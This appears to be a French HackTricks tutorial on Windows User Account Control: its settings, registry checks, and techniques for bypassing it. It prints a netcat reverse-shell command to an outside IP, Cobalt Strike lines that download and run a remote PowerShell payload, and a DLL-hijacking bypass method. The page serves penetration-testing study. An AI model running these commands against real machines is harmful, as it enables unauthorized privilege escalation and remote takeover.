# UAC - Contrôle de Compte d'Utilisateur

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks) pour construire et **automatiser des workflows** facilement, alimentés par les outils communautaires **les plus avancés**.\
Accédez-y dès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Le Contrôle de Compte d'Utilisateur (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) est une fonctionnalité qui permet une **demande de consentement pour les activités nécessitant des privilèges élevés**. Les applications ont différents niveaux d'`intégrité`, et un programme avec un niveau **élevé** peut effectuer des tâches qui **pourraient compromettre le système**. Lorsque l'UAC est activé, les applications et les tâches s'exécutent toujours sous le contexte de sécurité d'un compte non administrateur, à moins qu'un administrateur n'autorise explicitement ces applications/tâches à avoir un accès de niveau administrateur au système pour s'exécuter. C'est une fonctionnalité pratique qui protège les administrateurs contre les modifications non intentionnelles, mais elle n'est pas considérée comme une limite de sécurité.

Pour plus d'informations sur les niveaux d'intégrité :

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Lorsque l'UAC est en place, un utilisateur administrateur reçoit 2 jetons : une clé d'utilisateur standard, pour effectuer des actions régulières à un niveau normal, et une avec les privilèges d'administrateur.

Cette [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discute en profondeur du fonctionnement de l'UAC, y compris le processus de connexion, l'expérience utilisateur et l'architecture de l'UAC. Les administrateurs peuvent utiliser des politiques de sécurité pour configurer le fonctionnement de l'UAC spécifique à leur organisation au niveau local (en utilisant secpol.msc), ou configuré et déployé via des Objets de Stratégie de Groupe (GPO) dans un environnement de domaine Active Directory. Les différents paramètres sont discutés en détail [ici](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Il y a 10 paramètres de Stratégie de Groupe qui peuvent être définis pour l'UAC. Le tableau suivant fournit des détails supplémentaires :

| Paramètre de Stratégie de Groupe                                                                                                                                                                                                                                                                                                                                                   | Clé de Registre                | Paramètre par Défaut                                              |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------- | ------------------------------------------------------------ |
| [Contrôle de Compte d'Utilisateur : Mode d'approbation administrateur pour le compte administrateur intégré](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Désactivé                                                     |
| [Contrôle de Compte d'Utilisateur : Permettre aux applications UIAccess de demander une élévation sans utiliser le bureau sécurisé](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Désactivé                                                     |
| [Contrôle de Compte d'Utilisateur : Comportement de l'invite d'élévation pour les administrateurs en Mode d'approbation administrateur](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Demander le consentement pour les binaires non-Windows                  |
| [Contrôle de Compte d'Utilisateur : Comportement de l'invite d'élévation pour les utilisateurs standards](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Demander les identifiants sur le bureau sécurisé                 |
| [Contrôle de Compte d'Utilisateur : Détecter les installations d'applications et demander une élévation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Activé (par défaut pour les particuliers) Désactivé (par défaut pour les entreprises) |
| [Contrôle de Compte d'Utilisateur : Élever uniquement les exécutables qui sont signés et validés](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Désactivé                                                     |
| [Contrôle de Compte d'Utilisateur : Élever uniquement les applications UIAccess qui sont installées dans des emplacements sécurisés](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Activé                                                      |
| [Contrôle de Compte d'Utilisateur : Exécuter tous les administrateurs en Mode d'approbation administrateur](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Activé                                                      |
| [Contrôle de Compte d'Utilisateur : Passer au bureau sécurisé lors de la demande d'élévation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Activé                                                      |
| [Contrôle de Compte d'Utilisateur : Virtualiser les échecs d'écriture de fichiers et de registre vers des emplacements par utilisateur](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Activé                                                      |

### Théorie du Contournement de l'UAC

Certains programmes sont **automatiquement élevés** si l'**utilisateur appartient** au **groupe des administrateurs**. Ces binaires ont dans leurs _**Manifestes**_ l'option _**autoElevate**_ avec la valeur _**True**_. Le binaire doit également être **signé par Microsoft**.

Ensuite, pour **contourner** l'**UAC** (passer d'un niveau d'intégrité **moyen** à **élevé**), certains attaquants utilisent ce type de binaires pour **exécuter du code arbitraire** car il sera exécuté à partir d'un processus d'intégrité de niveau **Élevé**.

Vous pouvez **vérifier** le _**Manifeste**_ d'un binaire en utilisant l'outil _**sigcheck.exe**_ de Sysinternals. Et vous pouvez **voir** le **niveau d'intégrité** des processus en utilisant _Process Explorer_ ou _Process Monitor_ (de Sysinternals).

### Vérifier l'UAC

Pour confirmer si l'UAC est activé, faites :
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Si c'est **`1`**, alors l'UAC est **activé**, si c'est **`0`** ou qu'il **n'existe pas**, alors l'UAC est **inactif**.

Ensuite, vérifiez **quel niveau** est configuré :
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Si **`0`**, alors, UAC ne demandera pas (comme **désactivé**)
* Si **`1`**, l'admin est **demandé pour le nom d'utilisateur et le mot de passe** pour exécuter le binaire avec des droits élevés (sur le Bureau Sécurisé)
* Si **`2`** (**Toujours me notifier**), UAC demandera toujours une confirmation à l'administrateur lorsqu'il essaie d'exécuter quelque chose avec des privilèges élevés (sur le Bureau Sécurisé)
* Si **`3`**, comme `1` mais pas nécessairement sur le Bureau Sécurisé
* Si **`4`**, comme `2` mais pas nécessairement sur le Bureau Sécurisé
* Si **`5`**(**par défaut**), il demandera à l'administrateur de confirmer pour exécuter des binaires non Windows avec des privilèges élevés

Ensuite, vous devez regarder la valeur de **`LocalAccountTokenFilterPolicy`**\
Si la valeur est **`0`**, alors, seulement l'utilisateur **RID 500** (**Administrateur intégré**) est capable d'effectuer **des tâches d'admin sans UAC**, et si c'est `1`, **tous les comptes dans le groupe "Administrateurs"** peuvent les faire.

Et, finalement, regardez la valeur de la clé **`FilterAdministratorToken`**\
Si **`0`**(par défaut), le **compte Administrateur intégré peut** faire des tâches d'administration à distance et si **`1`**, le compte Administrateur intégré **ne peut pas** faire des tâches d'administration à distance, à moins que `LocalAccountTokenFilterPolicy` soit réglé sur `1`.

#### Résumé

* Si `EnableLUA=0` ou **n'existe pas**, **pas d'UAC pour personne**
* Si `EnableLua=1` et **`LocalAccountTokenFilterPolicy=1`, Pas d'UAC pour personne**
* Si `EnableLua=1` et **`LocalAccountTokenFilterPolicy=0` et `FilterAdministratorToken=0`, Pas d'UAC pour RID 500 (Administrateur intégré)**
* Si `EnableLua=1` et **`LocalAccountTokenFilterPolicy=0` et `FilterAdministratorToken=1`, UAC pour tout le monde**

Toutes ces informations peuvent être recueillies en utilisant le module **metasploit** : `post/windows/gather/win_privs`

Vous pouvez également vérifier les groupes de votre utilisateur et obtenir le niveau d'intégrité :
```
net user %username%
whoami /groups | findstr Level
```
## Contournement de l'UAC

{% hint style="info" %}
Notez que si vous avez un accès graphique à la victime, le contournement de l'UAC est simple car vous pouvez simplement cliquer sur "Oui" lorsque l'invite de l'UAC apparaît.
{% endhint %}

Le contournement de l'UAC est nécessaire dans la situation suivante : **l'UAC est activé, votre processus s'exécute dans un contexte d'intégrité moyenne, et votre utilisateur appartient au groupe des administrateurs**.

Il est important de mentionner qu'il est **beaucoup plus difficile de contourner l'UAC s'il est au niveau de sécurité le plus élevé (Toujours) que s'il est à l'un des autres niveaux (Par défaut).**

### UAC désactivé

Si l'UAC est déjà désactivé (`ConsentPromptBehaviorAdmin` est **`0`**), vous pouvez **exécuter un shell inversé avec des privilèges d'administrateur** (niveau d'intégrité élevé) en utilisant quelque chose comme :
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Contournement de l'UAC avec duplication de jeton

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Contournement **très** basique de l'UAC (accès complet au système de fichiers)

Si vous avez un shell avec un utilisateur qui est dans le groupe des Administrateurs, vous pouvez **monter le partage C$** via SMB (système de fichiers) localement sur un nouveau disque et vous aurez **accès à tout à l'intérieur du système de fichiers** (même le dossier personnel de l'Administrateur).

{% hint style="warning" %}
**Il semble que cette astuce ne fonctionne plus**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Contournement de l'UAC avec Cobalt Strike

Les techniques Cobalt Strike ne fonctionneront que si l'UAC n'est pas réglé à son niveau de sécurité maximal
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** et **Metasploit** disposent également de plusieurs modules pour **contourner** le **UAC**.

### KRBUACBypass

Documentation et outil disponibles sur [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits de contournement de l'UAC

[**UACME**](https://github.com/hfiref0x/UACME) est une **compilation** de plusieurs exploits de contournement de l'UAC. Notez que vous devrez **compiler UACME en utilisant Visual Studio ou msbuild**. La compilation créera plusieurs exécutables (comme `Source\Akagi\output\x64\Debug\Akagi.exe`), vous devrez savoir **lequel vous avez besoin.**\
Vous devez **faire attention** car certains contournements vont **déclencher d'autres programmes** qui vont **alerter** **l'utilisateur** qu'il se passe quelque chose.

UACME indique la **version de build à partir de laquelle chaque technique a commencé à fonctionner**. Vous pouvez rechercher une technique affectant vos versions :
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
#### Plus de contournements de l'UAC

**Toutes** les techniques utilisées ici pour contourner l'UAC **nécessitent** une **session interactive complète** avec la victime (une simple shell nc.exe ne suffit pas).

Vous pouvez obtenir cela en utilisant une session **meterpreter**. Migrez vers un **processus** qui a la valeur **Session** égale à **1** :

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ devrait fonctionner)

### Contournement de l'UAC avec GUI

Si vous avez accès à une **GUI, vous pouvez simplement accepter l'invite de l'UAC** lorsque vous la recevez, vous n'avez pas vraiment besoin de la contourner. Ainsi, avoir accès à une GUI vous permettra de contourner l'UAC.

De plus, si vous obtenez une session GUI que quelqu'un utilisait (potentiellement via RDP), il y a **certains outils qui seront exécutés en tant qu'administrateur** à partir desquels vous pourriez **exécuter** une **cmd** par exemple **en tant qu'admin** directement sans être à nouveau invité par l'UAC comme [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Cela pourrait être un peu plus **discret**.

### Contournement bruyant de l'UAC par force brute

Si cela ne vous dérange pas de faire du bruit, vous pourriez toujours **exécuter quelque chose comme** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) qui **demande à élever les permissions jusqu'à ce que l'utilisateur les accepte**.

### Votre propre contournement - Méthodologie de base de contournement de l'UAC

Si vous regardez **UACME**, vous remarquerez que **la plupart des contournements de l'UAC abusent d'une vulnérabilité de Dll Hijacking** (principalement en écrivant la dll malveillante dans _C:\Windows\System32_). [Lisez ceci pour apprendre à trouver une vulnérabilité de Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking.md).

1. Trouvez un binaire qui va **s'autoélever** (vérifiez que lorsqu'il est exécuté, il s'exécute à un niveau d'intégrité élevé).
2. Avec procmon, trouvez des événements "**NAME NOT FOUND**" qui peuvent être vulnérables au **DLL Hijacking**.
3. Vous aurez probablement besoin d'**écrire** la DLL dans des **chemins protégés** (comme C:\Windows\System32) où vous n'avez pas de permissions d'écriture. Vous pouvez contourner cela en utilisant :
   1. **wusa.exe** : Windows 7,8 et 8.1. Il permet d'extraire le contenu d'un fichier CAB dans des chemins protégés (car cet outil est exécuté à partir d'un niveau d'intégrité élevé).
   2. **IFileOperation** : Windows 10.
4. Préparez un **script** pour copier votre DLL dans le chemin protégé et exécutez le binaire vulnérable et autoélevé.

### Une autre technique de contournement de l'UAC

Consiste à surveiller si un **binaire autoélevé** tente de **lire** dans le **registre** le **nom/chemin** d'un **binaire** ou d'une **commande** à **exécuter** (c'est plus intéressant si le binaire recherche cette information à l'intérieur du **HKCU**).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks) pour construire et **automatiser des workflows** alimentés par les outils communautaires les **plus avancés**.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
